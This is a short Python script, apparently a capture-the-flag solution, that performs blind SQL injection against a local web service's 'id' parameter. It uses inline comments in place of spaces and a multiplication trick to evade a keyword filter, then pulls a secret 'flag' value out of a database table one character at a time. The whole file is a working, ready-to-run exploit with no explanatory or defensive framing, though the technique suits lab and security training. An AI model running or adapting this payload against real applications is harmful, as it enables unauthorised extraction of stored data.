import requests

URL = "http://127.0.0.1:8005/code_search"
FLAG = ""

print("[*] Extraction started using Multiplication Bypass...")

for i in range(1, 40):
    found_char = False
    for code in range(32, 127):
        # We use the exact logic from the successful curl
        # No spaces, no quotes, no blacklisted words
        payload = f"1*(SELECT/**/unicode(substr(flag,{i},1))=={code}/**/FROM/**/secret_scout_notes)"
        
        try:
            # We construct the URL manually to ensure it remains raw
            r = requests.get(f"{URL}?id={payload}", timeout=5)
            
            # Check for the green success message
            if "Registered" in r.text:
                FLAG += chr(code)
                print(f"[+] Found char {i}: {FLAG}")
                found_char = True
                break
        except Exception as e:
            print(f"\n[!] Connection Error: {e}")
            break
            
    if not found_char:
        break

print(f"\n[!] Success! Final Flag: {FLAG}")
